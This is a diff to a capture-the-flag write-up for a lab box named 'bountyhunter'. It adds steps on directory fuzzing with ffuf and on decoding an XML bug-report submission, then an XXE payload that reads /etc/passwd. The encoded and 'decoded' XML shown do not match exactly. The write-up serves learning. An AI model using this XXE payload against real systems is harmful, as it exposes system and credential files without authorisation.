@@ -45,11 +45,43 @@ A message is displayed on submission stating the DB isn't setup, however, the re
 Some other paths were discovered using ffuf:
 
   Command line : `ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://bountyhunter/assets/FUZZ -t 2 -v -o ffuf-forced-browsing-directories -of md`
-  Time: 2025-01-02T10:46:40-05:00
 
-  | FUZZ | URL | Redirectlocation | Position | Status Code | Content Length | Content Words | Content Lines | Content Type | Duration | ResultFile | ScraperData | Ffufhash
-  | :- | :-- | :--------------- | :---- | :------- | :---------- | :------------- | :------------ | :--------- | :----------- | :------------ | :-------- |
- | http://bountyhunter/assets/ |  | 14 | 403 | 277 | 20 | 10 | text/html; charset=iso-8859-1 | 21.886996ms |  |  | 58677e
-  | # | http://bountyhunter/assets/# |  | 13 | 403 | 277 | 20 | 10 | text/html; charset=iso-8859-1 | 22.443474ms |  |  | 58677d
-  | img | http://bountyhunter/assets/img | http://bountyhunter/assets/img/ | 39 | 301 | 317 | 20 | 10 | text/html; charset=iso-8859-1 | 22.871146ms |  |  | 5867727
-  |  | http://bountyhunter/assets/ |  | 45647 | 403 | 277 | 20 | 10 | text/html; charset=iso-8859-1 | 22.757757ms |  |  | 58677b24f
+These were /assets and /resources. Whilst nothing of interest was found using assets, resources displayed a directory listing. I was unable to find anything sensitive but some of the files did help give an understanding of how the application was working, epecially the bounty submission form. 
+
+When submitting the form the value is encoded using Base64 and URL encoding. 
+
+```bash
+# Enoded payload
+PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5hYTwvdGl0bGU%2BCgkJPGN3ZT5iYjwvY3dlPgoJCTxjdnNzPmNjPC9jdnNzPgoJCTxyZXdhcmQ%2BZGQ8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4%3D
+
+# Decoded Payload
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+		<bugreport>
+		<title>Test</title>
+		<cwe>101</cwe>
+		<cvss>10</cvss>
+		<reward>&names;</reward>
+		</bugreport>
+```
+
+This is interesting because it is submitting XML to the server, I decided to try adding a basic XXE payload to the saubmision and re-encoding. The updated XML became:
+
+```bash
+# Updated XML
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+		<!DOCTYPE data [
+		<!ENTITY names SYSTEM "/etc/passwd">
+		]>
+		<bugreport>
+		<title>Test</title>
+		<cwe>101</cwe>
+		<cvss>10</cvss>
+		<reward>&names;</reward>
+		</bugreport>
+```
+
+After encoding and resubmitting, I was able to view the /etc/passwd file, see screenshot below:
+
+![image](https://github.com/user-attachments/assets/032c3181-48ad-4604-9452-8de41cb168c5)
+
+I could now start looking for more interesting data on the system. 
